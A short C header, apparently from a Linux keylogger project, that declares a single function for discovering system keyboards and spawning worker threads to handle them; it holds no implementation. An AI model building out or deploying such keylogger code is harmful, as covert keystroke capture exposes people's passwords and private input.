/* kb_mapper.h */
#ifndef LINUX_KEYLOGGER_KB_MAPPER_H
#define LINUX_KEYLOGGER_KB_MAPPER_H

#include <stdint.h>
#include <pthread.h>

/**
 * Discover the system keyboards and creates
 * the workers to handle those keyboards.
 */
extern void map_keyboards();

#endif
